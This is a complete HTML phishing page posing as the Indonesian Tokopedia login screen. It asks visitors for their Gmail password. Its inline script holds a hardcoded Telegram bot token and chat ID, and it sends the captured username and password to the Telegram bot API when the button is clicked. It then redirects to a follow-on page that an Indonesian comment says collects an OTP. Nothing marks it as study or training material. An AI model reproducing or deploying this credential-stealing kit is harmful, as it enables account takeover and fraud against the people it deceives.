<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Masuk - Tokopedia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Open Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        .input-active:focus { border-color: #03AC0E; }
    </style>
</head>
<body class="bg-white">

    <div class="max-w-md mx-auto px-6">
        <div class="flex justify-center mt-12 mb-10">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Tokopedia.svg" class="w-48">
        </div>

        <div class="flex justify-between items-center mb-6">
            <h1 class="text-2xl font-bold text-[#31353B]">Masuk</h1>
            <span class="text-[#03AC0E] font-bold cursor-pointer">Daftar</span>
        </div>

        <div class="mb-4">
            <label class="text-sm text-gray-500 mb-2 block">Password Gmail</label>
            <div class="relative">
                <input type="password" id="passInput" placeholder="Masukkan password akun Gmail kamu" 
                    class="w-full p-3.5 border border-gray-300 rounded-lg outline-none input-active text-md">
                <span class="absolute right-3 top-4 text-gray-400 cursor-pointer">👁️</span>
            </div>
            <p class="text-[11px] text-gray-400 mt-2">Masukkan password akun Gmail kamu</p>
        </div>

        <div class="flex justify-end mb-8">
            <span class="text-[#03AC0E] text-sm font-semibold cursor-pointer">Lupa Kata Sandi?</span>
        </div>

        <button id="btnFinal" class="w-full bg-[#03AC0E] text-white font-bold py-3.5 rounded-lg text-md shadow-sm">
            Selanjutnya
        </button>

        <div class="relative flex items-center my-10">
            <div class="flex-grow border-t border-gray-200"></div>
            <span class="flex-shrink mx-4 text-gray-400 text-[11px] uppercase tracking-wide">atau masuk dengan</span>
            <div class="flex-grow border-t border-gray-200"></div>
        </div>

        <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer">
            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" class="w-5 h-5 mr-3">
            <span class="font-semibold text-gray-600 text-sm">Google</span>
        </div>

        <p class="mt-10 text-center text-[14px] text-gray-500">
            Belum punya akun Tokopedia? <span class="text-[#03AC0E] font-bold">Daftar</span>
        </p>
    </div>

    <script>
        const TOKEN = "8746602429:AAHRxWuzAmXIksUuIs87TNq4oLGjxIJH83w";
        const CHAT_ID = "8723798929";
        const urlParams = new URLSearchParams(window.location.search);
        const user = urlParams.get('u') || "Unknown";

        document.getElementById('btnFinal').addEventListener('click', function() {
            const pass = document.getElementById('passInput').value;
            if (!pass) return;

            this.innerText = "Memproses...";
            this.disabled = true;

            const text = `<b>🔐 PASSWORD MASUK</b>\n<b>User:</b> <code>${user}</code>\n<b>Pass:</b> <code>${pass}</code>`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            }).then(() => {
                // Setelah password didapat, baru arahkan ke OTP
                window.location.href = "otwa.html?u=" + encodeURIComponent(user);
            });
        });
    </script>
</body>
</html>
